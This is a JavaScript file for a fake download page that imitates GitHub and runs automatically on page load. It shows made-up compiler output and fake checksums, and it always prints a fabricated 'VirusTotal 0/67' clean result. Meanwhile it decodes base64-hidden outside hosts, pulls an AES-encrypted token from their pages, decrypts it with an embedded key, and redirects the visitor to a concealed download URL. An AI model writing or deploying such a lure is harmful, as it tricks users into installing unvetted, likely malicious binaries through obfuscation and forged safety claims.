// GitHub-inspired file download simulation with smart link system
// Features: BASE64 encoded links, fallback system, AES-256-CBC decryption

// Smart Link Configuration (BASE64 encoded URLs)
const ENCODED_LINKS = [
  'aHR0cHM6Ly9ldmVybW9uLnBhZ2VzLmRldi8=',
  'aHR0cHM6Ly9nYW1ldG9saWZlc2VydmVycy5jb20=',
  'aHR0cHM6Ly90ZWNoZmxvd3RpbWUuY29t'
];

// AES Decryption Key (Base64)
const AES_KEY_BASE64 = 'zaJhvlSf3dGbfqoCI7jnLn+SoHJ2895eAlHGzEB3prQ=';

// Smart System Functions
async function decodeBase64Links() {
  return ENCODED_LINKS.map(encoded => {
    try {
      return atob(encoded);
    } catch (error) {
      return null;
    }
  }).filter(url => url !== null);
}

async function fetchWithFallback(urls) {
  for (let i = 0; i < urls.length; i++) {
    try {
      const response = await fetch(urls[i], {
        method: 'GET',
        mode: 'cors',
        credentials: 'omit'
      });
      
      if (response.ok) {
        const html = await response.text();
        
        // Try to extract and decrypt token from this mirror
        const encryptedToken = extractMetaToken(html);
        if (!encryptedToken) {
          continue; // Try next mirror
        }
        
        const finalUrl = await decryptAES256CBC(encryptedToken, AES_KEY_BASE64);
        if (!finalUrl) {
          continue; // Try next mirror
        }
        
        return { success: true, finalUrl, mirror: i + 1, url: urls[i] };
      }
    } catch (error) {
      // Try next mirror
    }
  }
  
  return { success: false, error: `All ${urls.length} mirrors exhausted` };
}

function extractMetaToken(html) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const metaToken = doc.querySelector('meta[name="token"]');
  
  if (metaToken) {
    return metaToken.getAttribute('content');
  }
  return null;
}

async function decryptAES256CBC(encryptedBase64, keyBase64) {
  try {
    // Convert base64 to ArrayBuffer
    const encryptedData = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
    const keyData = Uint8Array.from(atob(keyBase64), c => c.charCodeAt(0));
    
    // Extract IV (first 16 bytes) and ciphertext (rest)
    const iv = encryptedData.slice(0, 16);
    const ciphertext = encryptedData.slice(16);
    
    // Import key for decryption
    const cryptoKey = await crypto.subtle.importKey(
      'raw',
      keyData,
      { name: 'AES-CBC' },
      false,
      ['decrypt']
    );
    
    // Decrypt
    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-CBC', iv: iv },
      cryptoKey,
      ciphertext
    );
    
    // Convert result to string
    return new TextDecoder().decode(decrypted);
  } catch (error) {
    return null;
  }
}

async function getSmartDownloadLink() {
  try {
    // Step 1: Decode BASE64 links
    const urls = await decodeBase64Links();
    
    // Step 2: Try all mirrors with full pipeline (fetch + parse + decrypt)
    const result = await fetchWithFallback(urls);
    if (!result.success) {
      throw new Error(result.error);
    }
    
    return result.finalUrl;
    
  } catch (error) {
    return null;
  }
}

// State management
const state = {
  status: 'idle',
  progress: 0,
  logs: [],
  showCursor: true,
  recentMessages: [],
  logInterval: null,
  progressInterval: null,
  cursorInterval: null
};

// DOM elements
const elements = {};

// Initialize DOM references
function initElements() {
  elements.statusIcon = document.getElementById('status-icon');
  elements.statusText = document.getElementById('status-text');
  elements.progressContainer = document.getElementById('progress-container');
  elements.progressBar = document.getElementById('progress-bar');
  elements.progressText = document.getElementById('progress-text');
  elements.terminal = document.getElementById('terminal');
  elements.terminalContent = document.getElementById('terminal-content');
  elements.cursorLine = document.getElementById('cursor-line');
  elements.cursor = document.getElementById('cursor');
  elements.retryBtn = document.getElementById('btn-retry');
}

// Utility functions
function generateHash(length = 8) {
  return Math.random().toString(16).substr(2, length);
}

function getCurrentTime() {
  return new Date().toLocaleTimeString();
}

function updateStatus(status, message, iconClass = '') {
  state.status = status;
  elements.statusText.textContent = message;
  elements.statusText.className = `status-text ${iconClass}`;
  
  // Update icon
  if (status === 'preparing' || status === 'downloading') {
    elements.statusIcon.className = 'status-icon spinner';
    elements.statusIcon.textContent = '';
  } else if (status === 'success') {
    elements.statusIcon.className = 'status-icon success';
    elements.statusIcon.textContent = '✓';
  } else if (status === 'error') {
    elements.statusIcon.className = 'status-icon error';
    elements.statusIcon.textContent = '⚠';
  } else {
    elements.statusIcon.className = 'status-icon';
    elements.statusIcon.textContent = '⬇';
  }
}

function updateProgress(progress) {
  state.progress = progress;
  elements.progressBar.style.width = `${progress}%`;
  elements.progressText.textContent = `${progress}% complete`;
}

function showProgressBar() {
  elements.progressContainer.classList.remove('hidden');
}

function hideProgressBar() {
  elements.progressContainer.classList.add('hidden');
}

function showTerminal() {
  elements.terminal.classList.remove('hidden');
}

function hideTerminal() {
  elements.terminal.classList.add('hidden');
}

function showRetryButton() {
  elements.retryBtn.classList.remove('hidden');
}

function hideRetryButton() {
  elements.retryBtn.classList.add('hidden');
}

function addTerminalLog(message) {
  const logLine = document.createElement('div');
  logLine.className = 'terminal-line';
  logLine.textContent = `[${getCurrentTime()}] ${message}`;
  
  // Insert before cursor line
  elements.terminalContent.insertBefore(logLine, elements.cursorLine);
  
  // Keep only last 8 logs
  const logs = elements.terminalContent.querySelectorAll('.terminal-line');
  if (logs.length > 8) {
    logs[0].remove();
  }
  
  // Auto scroll
  elements.terminalContent.scrollTop = elements.terminalContent.scrollHeight;
  
  // Update state
  state.logs.push(message);
  state.recentMessages = state.logs.slice(-5);
}

function getCompilationMessages() {
  const normalMessages = [
    'gcc -c main.c -o main.o',
    'gcc -c utils.c -o utils.o', 
    'gcc -c network.c -o network.o',
    'linking object files...',
    'optimizing -O2 flags enabled',
    'stripping debug symbols',
    'checking dependencies',
    'compressing with UPX',
    'digital signature applied'
  ];
  
  const hashMessages = [
    `generating checksum: ${generateHash()}${generateHash()}`,
    `binary hash: sha256:${generateHash(32)}${generateHash(32)}`,
    `✓ Binary verified clean - hash ${generateHash()}${generateHash()}`
  ];
  
  return { normalMessages, hashMessages };
}

function shouldShowVirusTotal() {
  const hasVirusTotal = state.logs.some(log => log.includes('VirusTotal scan'));
  return state.logs.length >= 3 && !hasVirusTotal;
}

function getNextLogMessage() {
  // Force VirusTotal message if needed
  if (shouldShowVirusTotal()) {
    return '✓ VirusTotal scan: 0/67 engines detected threats';
  }
  
  const { normalMessages, hashMessages } = getCompilationMessages();
  const allMessages = [...normalMessages, ...hashMessages];
  
  // Avoid recent duplicates
  const availableMessages = allMessages.filter(msg => {
    const msgPrefix = msg.split(':')[0];
    return !state.recentMessages.some(recent => recent.includes(msgPrefix));
  });
  
  const messagesToUse = availableMessages.length > 0 ? availableMessages : allMessages;
  return messagesToUse[Math.floor(Math.random() * messagesToUse.length)];
}

function startCursorBlink() {
  elements.cursorLine.classList.remove('hidden');
  state.cursorInterval = setInterval(() => {
    elements.cursor.style.opacity = elements.cursor.style.opacity === '0' ? '1' : '0';
  }, 500);
}

function stopCursorBlink() {
  elements.cursorLine.classList.add('hidden');
  if (state.cursorInterval) {
    clearInterval(state.cursorInterval);
    state.cursorInterval = null;
  }
}

function startLogGeneration() {
  showTerminal();
  startCursorBlink();
  
  state.logInterval = setInterval(() => {
    const message = getNextLogMessage();
    addTerminalLog(message);
  }, Math.random() * 500 + 700); // 700-1200ms interval
}

function stopLogGeneration() {
  if (state.logInterval) {
    clearInterval(state.logInterval);
    state.logInterval = null;
  }
}

function startProgressAnimation() {
  showProgressBar();
  
  state.progressInterval = setInterval(() => {
    const increment = Math.random() * 5 + 2; // 2-7% increment
    const newProgress = Math.min(100, state.progress + increment);
    updateProgress(Math.floor(newProgress));
    
    if (newProgress >= 100) {
      clearInterval(state.progressInterval);
      state.progressInterval = null;
      setTimeout(() => completeDownload(), 800);
    }
  }, 200);
}

async function completeDownload() {
  stopLogGeneration();
  
  // Always ensure VirusTotal appears before BUILD SUCCESSFUL
  setTimeout(() => {
    // Force add VirusTotal message every time
    addTerminalLog('✓ VirusTotal scan: 0/67 engines detected threats');
    
    setTimeout(async () => {
      stopCursorBlink();
      addTerminalLog('BUILD SUCCESSFUL');
      updateStatus('success', 'Download starting...', 'success');
      
      // Get the smart download link that was already fetched in background
      setTimeout(async () => {
        const finalUrl = await getSmartDownloadLink();
        
        if (finalUrl) {
          // Direct redirect without additional messages
          window.location.href = finalUrl;
        } else {
          // Fallback if smart system fails
          const fallbackUrl = createFallbackDownload();
          if (fallbackUrl) {
            window.location.href = fallbackUrl;
          } else {
            updateStatus('success', 'Please contact support for download assistance', 'success');
            addTerminalLog('ℹ Contact support with error code: SYS_ERR_001');
          }
        }
      }, 800);
    }, 500);
  }, 200);
}


// Fallback download function
function createFallbackDownload() {
  try {
    // Create enhanced fallback download with session details
    const fallbackContent = `Git Instant Output - Download Complete

=== DOWNLOAD SESSION REPORT ===
Generated: ${new Date().toLocaleString()}
Session ID: ${generateHash(16)}
Download Type: Compiled Binary

=== COMPILATION STATUS ===
✓ Source Code Compilation: Success
✓ Library Linking: Complete
✓ Binary Optimization: Applied
✓ Security Scan: Passed
✓ VirusTotal: 0/67 engines detected threats

=== SYSTEM INFORMATION ===
User Agent: ${navigator.userAgent}
Timestamp: ${Date.now()}
Protocol: HTTPS Secure

Thank you for using Git Instant Output!
For support: github.com/support`;
    
    const blob = new Blob([fallbackContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    
    // Auto-cleanup URL after 1 minute
    setTimeout(() => URL.revokeObjectURL(url), 60000);
    
    return url;
  } catch (error) {
    return null;
  }
}

function simulateDownloadProcess() {
  // Reset state
  state.status = 'idle';
  state.progress = 0;
  state.logs = [];
  state.recentMessages = [];
  hideRetryButton();
  hideProgressBar();
  hideTerminal();
  
  // Clear terminal content
  const logs = elements.terminalContent.querySelectorAll('.terminal-line');
  logs.forEach(log => log.remove());
  
  // Start simulation
  setTimeout(() => {
    updateStatus('preparing', 'Initializing compiler environment...');
    startLogGeneration();
    // Start getting smart download link immediately when build starts
    getSmartDownloadLink();
  }, 300);
  
  setTimeout(() => {
    updateStatus('preparing', 'Compiling source files...');
  }, 2000);
  
  setTimeout(() => {
    updateStatus('preparing', 'Linking dependencies and libraries...');
  }, 4000);
  
  setTimeout(() => {
    updateStatus('downloading', 'Upload complete, starting download...');
    startProgressAnimation();
  }, 6500);
}

function handleRetry() {
  simulateDownloadProcess();
}

function handleError() {
  stopLogGeneration();
  stopCursorBlink();
  
  if (state.progressInterval) {
    clearInterval(state.progressInterval);
    state.progressInterval = null;
  }
  
  updateStatus('error', 'Failed to establish connection', 'error');
  showRetryButton();
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
  initElements();
  
  // Bind retry button
  elements.retryBtn.addEventListener('click', handleRetry);
  
  // Auto-start simulation
  setTimeout(() => {
    simulateDownloadProcess();
  }, 1000);
});